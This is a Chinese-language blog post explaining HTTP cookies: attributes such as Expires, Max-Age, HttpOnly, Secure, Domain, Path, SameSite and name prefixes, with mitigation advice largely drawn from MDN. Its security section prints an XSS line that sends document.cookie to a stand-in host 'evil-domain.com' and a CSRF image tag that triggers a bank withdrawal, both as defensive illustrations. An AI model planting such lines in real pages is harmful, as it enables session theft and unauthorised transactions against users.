<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>你真的了解Cookie吗？ - 编程鬼谷子的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="你真的了解Cookie吗？" />
<meta property="og:description" content="首先要了解到的是：像cookie、localStorage、书签等等浏览器提供的功能，数据都是存储在用户电脑本机中。 Cookie是什么？ HTTP Cookie是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的HTTP协议记录稳定的状态信息成为了可能。
cookie是服务端发送给用户浏览器保存到本地的一小块数据，创建之初的目的就是服务端写入到浏览器，后由浏览器发送请求时，携带到服务端进行验证。
cookie的设计之初，是由服务端通过Set-Cookie设置到浏览器中，后续由浏览器进行维护，既然是通过响应头中的Set-Cookie来设置，每条cookie的属性众多，所以设置的形式如下：
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; httpOnly; Cookie 主要用于以下三个方面：
会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）个性化设置（如用户自定义设置、主题等）浏览器行为跟踪（如跟踪分析用户行为等） Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。
cookie的缺点：http请求每次都会携带cookie，导致性能开销大；（跨域，cookie的域名 会影响是否携带cookie）
每条Cookie的属性值和意义 name和value name由下划线和字母组成，区分大小写；value的类型是字符串。设置方式如下：
Set-Cookie: id=a3fWa;
通常情况下，设置每条cookie的value值size都比较小，大约十几个字节或几十个字节，超过100字节的比较少见。
expires/Max-Age expires参数是 Netscape 烘焙的原始 cookie 的一部分。在 HTTP 版本 1.1 中，expires它已被弃用，取而代之的是使用max-age，无需指定日期，您只需说出 cookie 可以存活多长时间。通过设置其中任何一个，cookie 将持续存在直到过期，否则——如果你都没有设置——cookie 将持续到你关闭浏览器（“Session cookie”）。
设置cookie的过期时间，如果是Session，表明浏览器关闭后，该cookie失效；如果是具体的日期时间，表示到这个日期后，该cookie失效。如下：
expires和Max-Age的区别是什么呢？
Expires设置删除 cookie 的到期日期Max-age设置删除 cookie 的时间（以秒为单位），即当cookie设置成功后，多少秒以后失效。Internet Explorer（ie6、ie7 和 ie8）不支持“max-age”，而（大部分）所有浏览器都支 expires 那么我们又该怎么设置呢？
var d = new Date(); d." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcguiguzi.github.io/posts/7e8eef485a1d438d23b77a11f6a5754c/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-21T00:21:44+08:00" />
<meta property="article:modified_time" content="2022-04-21T00:21:44+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程鬼谷子的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">你真的了解Cookie吗？</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>首先要了解到的是：像cookie、localStorage、书签等等浏览器提供的功能，数据都是存储在用户电脑本机中。 </p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/96/bf/0mcvzcoc_o.png"></p> 
<h2>Cookie是什么？</h2> 
<p>HTTP Cookie是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#http_is_stateless_but_not_sessionless" rel="nofollow" title="无状态">无状态</a>的HTTP协议记录稳定的状态信息成为了可能。</p> 
<blockquote> 
 <p><strong>cookie是服务端发送给用户浏览器保存到本地的一小块数据，创建之初的目的就是服务端写入到浏览器，后由浏览器发送请求时，携带到服务端进行验证。</strong></p> 
 <p><strong>cookie的设计之初，是由服务端通过Set-Cookie设置到浏览器中，后续由浏览器进行维护，既然是通过响应头中的Set-Cookie来设置，每条cookie的属性众多，所以设置的形式如下：</strong></p> 
 <pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; httpOnly;</pre> 
</blockquote> 
<p><strong>Cookie 主要用于以下三个方面：</strong></p> 
<ul><li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li><li>个性化设置（如用户自定义设置、主题等）</li><li>浏览器行为跟踪（如跟踪分析用户行为等）</li></ul> 
<p>Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API" rel="nofollow" title="Web storage API">Web storage API</a> （本地存储和会话存储）或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API" rel="nofollow" title="IndexedDB">IndexedDB</a> 。</p> 
<blockquote> 
 <p>cookie的缺点：http请求每次都会携带cookie，导致性能开销大；（跨域，cookie的域名 会影响是否携带cookie）</p> 
</blockquote> 
<h2>每条Cookie的属性值和意义</h2> 
<h4>name和value</h4> 
<p>name由下划线和字母组成，区分大小写；value的类型是字符串。设置方式如下：</p> 
<blockquote> 
 <p>Set-Cookie: id=a3fWa;</p> 
 <p>通常情况下，设置每条cookie的value值size都比较小，大约十几个字节或几十个字节，超过100字节的比较少见。</p> 
</blockquote> 
<h4>expires/Max-Age</h4> 
<p><code>expires</code>参数是 Netscape 烘焙的原始 cookie 的一部分。在 HTTP 版本 1.1 中，<code>expires</code>它已被弃用，取而代之的是使用<code>max-age，</code>无需指定日期，您只需说出 cookie 可以存活多长时间。通过设置其中任何一个，cookie 将持续存在直到过期，否则——如果你都没有设置——cookie 将持续到你关闭浏览器（“Session cookie”）。</p> 
<p>设置cookie的过期时间，如果是Session，表明浏览器关闭后，该cookie失效；如果是具体的日期时间，表示到这个日期后，该cookie失效。如下：</p> 
<p><img alt="" height="281" src="https://images2.imgbox.com/45/b4/9oL6fmAY_o.png" width="157"></p> 
<p><strong>expires和Max-Age的区别是什么呢？</strong></p> 
<ul style="margin-left:0;"><li><code>Expires</code>设置删除 cookie 的到期日期</li><li><code>Max-age</code>设置删除 cookie 的时间（以秒为单位<strong>），即当cookie设置成功后，多少秒以后失效。</strong></li><li>Internet Explorer（ie6、ie7 和 ie8）不支持“max-age”，而（大部分）所有浏览器都支 expires</li></ul> 
<p><strong>那么我们又该怎么设置呢？</strong></p> 
<pre><code class="language-javascript">var d = new Date();
d.setTime(d.getTime() + 5*60*1000); // in milliseconds
document.cookie = 'foo=bar;path=/;expires='+d.toGMTString()+';';</code></pre> 
<pre><code class="language-javascript">document.cookie = 'foo=bar;path=/;max-age='+5*60+';';</code></pre> 
<p> 注意日期时间的</p> 
<pre><code class="language-javascript">const d = new Date()
d // Thu Apr 21 2022 00:16:35 GMT+0800 (中国标准时间)
d.toGMTString()
// 'Wed, 20 Apr 2022 16:16:35 GMT'</code></pre> 
<pre><code class="language-javascript">document.cookie="id=123; expires=Wed, 20 Apr 2022 16:30:35 GMT"</code></pre> 
<p>结果：</p> 
<p><img alt="" height="43" src="https://images2.imgbox.com/d1/43/yqdNBvQM_o.png" width="675"> </p> 
<p> </p> 
<p style="margin-left:0;text-align:left;"><span style="color:#333333;"><span style="background-color:#ffffff;"><strong>问：如果我在 cookie 中同时设置 expires 和 max-age 会怎样？</strong><br> A. 每个支持的浏览器<code>max-age</code>都会忽略<code>expires</code>它的值，同样，Internet Explorer 也会忽略它<code>max-age</code>而只使用<code>expires</code>.</span></span></p> 
<p style="margin-left:0;text-align:left;"><span style="color:#333333;"><span style="background-color:#ffffff;"><strong>问：如果我只在 cookie 中设置 max-age 怎么办？</strong><br> A. 每个浏览器——除了 Internet Explorer（8之前）——都能正确使用它。在 Internet Explorer 中，它将是一个会话 cookie（当您关闭浏览器时它将被删除）。</span></span></p> 
<p style="margin-left:0;text-align:left;"><span style="color:#333333;"><span style="background-color:#ffffff;"><strong>问：如果我只在 cookie 中设置了  expires 怎么办？</strong><br> A. 每个浏览器都正确使用，只要记住将它</span></span><span style="color:#1a439c;"><span style="background-color:#ffffff;">设置为 GMT 时间</span></span><span style="color:#333333;"><span style="background-color:#ffffff;">，如上例所示。</span></span></p> 
<p style="margin-left:0;text-align:left;"><span style="color:#333333;"><span style="background-color:#ffffff;"><strong>问：你从哪里得到这些事实？</strong><br> A. 我写了一个<a href="https://mrcoles.com/media/test/cookies-max-age-vs-expires.html" rel="nofollow" title="cookie 持久性测试页面">cookie 持久性测试页面</a>，并在 IE6、IE7、IE8、FF2、FF3、Safari 4、Google Chrome 和 Opera 9.6 上进行了测试。如果您在任何其他浏览器上尝试或发现任何矛盾之处，请告诉我。</span></span></p> 
<p><strong> 如果设置的过期时间有问题，将是Session Cookie</strong></p> 
<p></p> 
<h4>httpOnly 和 secure</h4> 
<h4>Domain和path</h4> 
<p></p> 
<h2></h2> 
<h2>创建cookie</h2> 
<p></p> 
<p>当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" rel="nofollow" title="Set-Cookie">Set-Cookie</a> 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过  <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie" rel="nofollow" title="Cookie">Cookie</a> 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p> 
<h4 id="set-cookie响应头部和cookie请求头部"><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#set-cookie%E5%93%8D%E5%BA%94%E5%A4%B4%E9%83%A8%E5%92%8Ccookie%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%83%A8" rel="nofollow" title="Set-Cookie响应头部和Cookie请求头部">Set-Cookie响应头部和Cookie请求头部</a></h4> 
<p>服务器使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" rel="nofollow" title="Set-Cookie">Set-Cookie</a> 响应头部向用户代理（一般是浏览器）发送 Cookie信息。一个简单的 Cookie 可能像这样：</p> 
<blockquote> 
 <pre>Set-Cookie: &lt;cookie名&gt;=&lt;cookie值&gt;</pre> 
</blockquote> 
<p>服务器通过该头部告知客户端保存 Cookie 信息。</p> 
<blockquote> 
 <pre>HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[页面内容]</pre> 
</blockquote> 
<p id="The_client_sends_back_to_the_server_its_cookies_previously_stored">现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie" rel="nofollow" title="Cookie">Cookie</a> 请求头部再发送给服务器。</p> 
<blockquote> 
 <pre>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre> 
</blockquote> 
<blockquote> 
 <p><strong>提示:</strong> 如何在以下几种服务端程序中设置 <code>Set-Cookie</code> 响应头信息 :</p> 
 <ul><li><a href="https://secure.php.net/manual/en/function.setcookie.php" rel="nofollow" title="PHP">PHP</a></li><li><a href="https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value" rel="nofollow" title="Node.JS">Node.JS</a></li><li><a href="https://docs.python.org/3/library/http.cookies.html" rel="nofollow" title="Python">Python</a></li><li><a href="https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html" rel="nofollow" title="Ruby on Rails">Ruby on Rails</a></li></ul> 
</blockquote> 
<p></p> 
<h4>定义 Cookie 的生命周期</h4> 
<p>Cookie 的生命周期可以通过两种方式定义：</p> 
<ul><li>会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（<code>Expires</code>）或者有效期（<code>Max-Age</code>）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。</li><li>持久性 Cookie 的生命周期取决于过期时间（<code>Expires</code>）或有效期（<code>Max-Age</code>）指定的一段时间。</li></ul> 
<p>例如：</p> 
<blockquote> 
 <pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</pre> 
</blockquote> 
<p><strong>提示：</strong>当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。</p> 
<p>如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks" rel="nofollow" title="会话固定攻击（session fixation attacks） (en-US)">会话固定攻击（session fixation attacks） (en-US)</a>，在该攻击中第三方可以重用用户的会话。 </p> 
<h4>限制访问cookie</h4> 
<p>有两种方法可以确保 <code>Cookie</code> 被安全发送，并且不会被意外的参与者或脚本访问：<code>Secure</code> 属性和<code>HttpOnly</code> 属性。</p> 
<p>标记为 <code>Secure</code> 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/MitM" rel="nofollow" title="man-in-the-middle">man-in-the-middle</a> 攻击者的攻击。但即便设置了 <code>Secure</code> 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，<code>Secure</code> 标记也无法提供确实的安全保障, 例如，可以访问客户端硬盘的人可以读取它。</p> 
<blockquote> 
 <p>从 Chrome 52 和 Firefox 52 开始，不安全的站点（<code>http:</code>）无法使用Cookie的 <code>Secure</code> 标记。</p> 
</blockquote> 
<h4></h4> 
<p><strong>JavaScript <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" rel="nofollow" title="Document.cookie">Document.cookie</a> API 无法访问带有 <code>HttpOnly</code> 属性的cookie；</strong></p> 
<p>此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 <code>HttpOnly</code> 属性。此预防措施有助于缓解<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks" rel="nofollow" title="跨站点脚本（XSS） (en-US)">跨站点脚本（XSS） (en-US)</a>攻击。</p> 
<p>示例：</p> 
<blockquote> 
 <pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</pre> 
</blockquote> 
<h4>cookie的作用域</h4> 
<p><code>Domain</code> 和 <code>Path</code> 标识定义了Cookie的<em>作用域：</em>即允许 Cookie 应该发送给哪些URL。</p> 
<p><strong>Domain 属性</strong></p> 
<p><code>Domain</code> 指定了哪些主机可以接受 Cookie。如果不指定，默认为 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Origin" rel="nofollow" title="origin">origin</a>，<strong>不包含子域名</strong>。如果指定了<code>Domain</code>，则一般包含子域名。因此，指定 <code>Domain</code> 比省略它的限制要少。但是，当子域需要共享有关用户的信息时，这可能会有所帮助。 </p> 
<p>例如，如果设置 <code>Domain=mozilla.org</code>，则 Cookie 也包含在子域名中（如<code>developer.mozilla.org</code>）。</p> 
<blockquote> 
 <p>B站的cookie就是在bilibili.com下和message.bilibili.com下都有一样的cookie信息</p> 
</blockquote> 
<p>当前大多数浏览器遵循 <a href="https://tools.ietf.org/html/rfc6265" rel="nofollow" title="RFC 6265">RFC 6265</a>，设置 Domain 时 不需要加前导点。浏览器不遵循该规范，则需要加前导点，例如：<code>Domain=.mozilla.org</code></p> 
<blockquote> 
 <p>chrome浏览器打开B站，B站的cookie的Domain都是带点的。</p> 
</blockquote> 
<p><strong>Path 属性</strong></p> 
<p><code>Path</code> 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 <code>%x2F</code> ("/") 作为路径分隔符，子路径也会被匹配。</p> 
<p>例如，设置 <code>Path=/docs</code>，则以下地址都会匹配：</p> 
<blockquote> 
 <ul><li><code>/docs</code></li><li><code>/docs/Web/</code></li><li><code>/docs/Web/HTTP</code></li></ul> 
</blockquote> 
<p><strong>SameSite attribute</strong></p> 
<p><code>SameSite</code> Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，（其中  <a href="https://developer.mozilla.org/en-US/docs/Glossary/Site" rel="nofollow" title="Site (en-US)">Site (en-US)</a> 由可注册域定义），从而可以阻止跨站请求伪造攻击（<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF" rel="nofollow" title="CSRF">CSRF</a>）。</p> 
<p>SameSite cookies 是相对较新的一个字段，<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility" rel="nofollow" title="所有主流浏览器都已经得到支持">所有主流浏览器都已经得到支持</a>。</p> 
<p>下面是例子：</p> 
<pre><code>Set-Cookie: key=value; SameSite=Strict</code></pre> 
<blockquote> 
 <p>SameSite 可以有下面三种值：</p> 
 <ul><li><code><strong>None</strong></code><strong>。</strong>浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。</li><li><strong><code>Strict</code>。</strong>浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）</li><li><strong><code>Lax</code>。</strong>与 <strong><code>Strict</code> </strong>类似，但用户从外部站点导航至URL时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到URL时才会发送。如 link 链接</li></ul> 
</blockquote> 
<p>以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookies 会被包含在任何请求中——包括跨站请求。</p> 
<p>大多数主流浏览器正在将 <a href="https://www.chromestatus.com/feature/5088147346030592" rel="nofollow" title="SameSite 的默认值迁移至 Lax">SameSite 的默认值迁移至 Lax</a>。如果想要指定 Cookies 在同站、跨站请求都被发送，现在需要明确指定 SameSite 为 None。</p> 
<p><strong>Cookie prefixes</strong></p> 
<p>cookie 机制的使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。</p> 
<p>子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks" rel="nofollow" title="会话劫持（ session fixation） (en-US)">会话劫持（ session fixation） (en-US)</a>。</p> 
<p>但是，作为<a href="https://en.wikipedia.org/wiki/Defense_in_depth_%28computing%29" rel="nofollow" title="深度防御措施">深度防御措施</a>，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用：</p> 
<p><code>__Host-</code></p> 
<p>如果 cookie 名称具有此前缀，则仅当它也用 <code>Secure</code> 属性标记，是从安全来源发送的，不包括 <code>Domain</code> 属性，并将 <code>Path</code> 属性设置为 <code>/</code> 时，它才在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" rel="nofollow" title="Set-Cookie">Set-Cookie</a> 标头中接受。这样，这些 cookie 可以被视为 "domain-locked”。</p> 
<p><code>__Secure-</code></p> 
<p>如果 cookie 名称具有此前缀，则仅当它也用 <code>Secure</code> 属性标记，是从安全来源发送的，它才在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" rel="nofollow" title="Set-Cookie">Set-Cookie</a> 标头中接受。该前缀限制要弱于 <code>__Host-</code> 前缀。</p> 
<p>带有这些前缀点 Cookie， 如果不符合其限制的会被浏览器拒绝。请注意，这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对会话劫持的防御措施。</p> 
<p>在应用程序服务器上，Web 应用程序<strong>必须</strong>检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie" rel="nofollow" title="Cookie">Cookie</a> 标头中发送前缀之前，<strong>不会</strong>从 cookie 中剥离前缀。</p> 
<p>有关 cookie 前缀和浏览器支持的当前状态的更多信息，请参阅 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie#cookie_prefixes" rel="nofollow" title="Prefixes section of the Set-Cookie reference article">Prefixes section of the Set-Cookie reference article</a>。</p> 
<h4>js通过document.cookie访问Cookie</h4> 
<p>通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" rel="nofollow" title="Document.cookie">Document.cookie</a> 属性可创建新的 Cookie，也可通过该属性访问非<code>HttpOnly</code>标记的Cookie。</p> 
<pre><code>document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"</code></pre> 
<p>通过 JavaScript 创建的 Cookie 不能包含 HttpOnly 标志。</p> 
<p>请留意在<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#Security" rel="nofollow" title="安全">安全</a>章节提到的安全隐患问题，JavaScript 可以通过跨站脚本攻击（XSS）的方式来窃取 Cookie。</p> 
<h4>安全</h4> 
<blockquote> 
 <p>信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。</p> 
 <p>当机器处于不安全环境时，切记<em>不能</em>通过 HTTP Cookie 存储、传输敏感信息。</p> 
</blockquote> 
<p> <strong>缓解涉及Cookie的攻击的方法：</strong></p> 
<ul><li>使用 <code>HttpOnly</code> 属性可防止通过 JavaScript 访问 cookie 值。</li><li>用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 <code>SameSite</code> 属性设置为<code>Strict</code> 或 <code>Lax</code>。（请参见上方的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies%24edit#" rel="nofollow" title="SameSite Cookie">SameSite Cookie</a>。）在<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility" rel="nofollow" title="支持 SameSite 的浏览器">支持 SameSite 的浏览器</a>中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。</li></ul> 
<h4>会话劫持和XSS</h4> 
<p>在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 <a href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting" rel="nofollow" title="XSS (en-US)">XSS (en-US)</a> 攻击。</p> 
<pre><code class="language-javascript">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;</code></pre> 
<p><code>HttpOnly</code> 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。</p> 
<h4> 跨站请求伪造</h4> 
<p><a href="https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery" rel="nofollow" title="维基百科">维基百科</a>已经给了一个比较好的 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF" rel="nofollow" title="CSRF">CSRF</a> 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：</p> 
<pre><code class="language-javascript">&lt;img src="http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"&gt;</code></pre> 
<p>当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：</p> 
<ul><li>对用户输入进行过滤来阻止 <a href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting" rel="nofollow" title="XSS (en-US)">XSS (en-US)</a>；</li><li>任何敏感操作都需要确认；</li><li>用于敏感信息的 Cookie 只能拥有较短的生命周期；</li><li>更多方法可以查看<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet" rel="nofollow" title="OWASP CSRF prevention cheat sheet">OWASP CSRF prevention cheat sheet</a>。</li></ul> 
<p></p> 
<h4>参考文章：</h4> 
<p><a class="has-card" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" rel="nofollow" title="HTTP cookies - HTTP | MDN"><span class="link-card-box"><span class="link-title">HTTP cookies - HTTP | MDN</span><span class="link-link"><img alt="" class="link-link-icon" src="https://images2.imgbox.com/56/9e/gRJ7Ekx5_o.png">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies</span></span></a></p> 
<p><a class="has-card" href="https://mrcoles.com/blog/cookies-max-age-vs-expires/" rel="nofollow" title="HTTP Cookies: What's the difference between Max-age and Expires? - Peter Coles"><span class="link-card-box"><span class="link-title">HTTP Cookies: What's the difference between Max-age and Expires? - Peter Coles</span><span class="link-link"><img class="link-link-icon" src="https://images2.imgbox.com/63/c7/hFoQ2K4Z_o.png" alt="icon-default.png?t=M3C8">https://mrcoles.com/blog/cookies-max-age-vs-expires/</span></span></a> </p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0e0dd02c77ce3bf7911d1909ae483c45/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">数据结构-单链表的基本实现（C语言，简单易懂，含全部代码）</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/8227efad9c5e82993d043358b8f32fa6/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【计算机网络】TCP四次挥手过程详解</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程鬼谷子的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>